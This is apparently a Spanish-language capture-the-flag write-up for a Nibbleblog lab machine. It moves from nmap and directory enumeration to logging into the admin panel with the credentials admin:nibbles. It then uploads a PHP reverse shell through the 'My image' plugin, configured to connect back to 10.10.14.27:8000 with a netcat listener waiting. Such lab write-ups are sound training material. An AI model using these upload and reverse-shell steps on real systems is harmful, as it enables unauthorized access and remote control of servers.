### NMAP
```
nmap -p- -Pn -sS -sV 10.129.96.84
```
![[Pasted image 20260118014946.png]]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

### WEB
Accedemos a http://10.129.96.84/
![[Pasted image 20260118015023.png]]
Analizamos el código fuente de la página
![[Pasted image 20260118015044.png]]
```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Accedemos a http://10.129.96.84/nibbleblog/
![[Pasted image 20260118015130.png]]

### GOBUSTER
```
gobuster dir -u http://10.129.96.84/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
![[Pasted image 20260118015646.png]]
/content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
/themes               (Status: 301) [Size: 324] [--> http://10.129.96.84/nibbleblog/themes/]
/admin                (Status: 301) [Size: 323] [--> http://10.129.96.84/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 327] [--> http://10.129.96.84/nibbleblog/languages/]

```
gobuster dir -u http://10.129.96.84/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```
![[Pasted image 20260118025400.png]]
/admin.php            (Status: 200) [Size: 1401]

### FEROXBUSTER
```
feroxbuster -u http://10.129.96.84/nibbleblog/content
```
![[Pasted image 20260118021900.png]]
200      GET        2l       17w      503c http://10.129.96.84/nibbleblog/content/private/users.xml
![[Pasted image 20260118022251.png]]
200      GET        0l        0w        0c http://10.129.96.84/nibbleblog/content/private/keys.php
200      GET        2l       15w      266c http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/db.xml
![[Pasted image 20260118022333.png]]
200      GET        2l       16w      239c http://10.129.96.84/nibbleblog/content/private/plugins/hello/db.xml
![[Pasted image 20260118022349.png]]
200      GET        2l       12w      229c http://10.129.96.84/nibbleblog/content/private/plugins/categories/db.xml
![[Pasted image 20260118022401.png]]

### WEB
Accedemos a http://10.129.96.84/nibbleblog/admin.php
Credenciales admin:nibbles
![[Pasted image 20260118025551.png]]
Accedemos a http://10.129.96.84/nibbleblog/admin.php?controller=plugins&action=list
Observamos que únicamente en el plugin "My image" se permite subir archivos
![[Pasted image 20260118134652.png]]
![[Pasted image 20260118134712.png]]
### REVERSE SHELL
Utilizamos una shell por defecto y la modificamos 
```
cp /usr/share/webshells/php/php-reverse-shell.php shell2.php
```
![[Pasted image 20260118133935.png]]
```
nano shell2.php
```
![[Pasted image 20260118134054.png]]
$ip = '10.10.14.27';  // CHANGE THIS
$port = 8000;       // CHANGE THIS

Cargamos la shell en el plugin 
![[Pasted image 20260118134959.png]]

Ponemos en escucha netcat en el puerto 8000
```
nc -lvnp 8000
```

Accedemos a la ruta donde se guardan los archivos referentes a las plantillas
```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
```
![[Pasted image 20260118135035.png]]

Al cargar el archivo image.php comprobamos que la shell funciona y conseguimos acceso al servidor
![[Pasted image 20260118135247.png]]![[Pasted image 20260118135339.png]]
